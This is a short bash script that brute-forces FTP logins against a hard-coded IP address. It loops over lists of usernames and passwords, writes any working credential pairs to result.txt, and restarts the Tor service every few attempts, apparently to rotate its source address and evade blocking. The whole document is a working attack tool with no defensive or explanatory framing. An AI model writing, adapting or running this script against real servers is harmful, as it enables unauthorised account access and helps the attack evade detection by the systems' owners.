count=0

cat users.txt | while read -r user; do

        cat passwords.txt | while read -r password; do

                answer=`
                        ftp -n 82.142.152.28 <<END_SCRIPT
                        quote USER $user
                        quote PASS $password
                        END_SCRIPT
                        `

        if [[ $answer == *"Not connected"* ]] || [[ $answer == *"incorrect"* ]]; then
                echo "$answer"
        else
                echo "user:$user,password:$password" >> result.txt
        fi

        count=$((count + 1))

        echo $count
        if  [ $count -gt 3 ];then
                sudo service tor restart
                count=0
        fi
        done
done

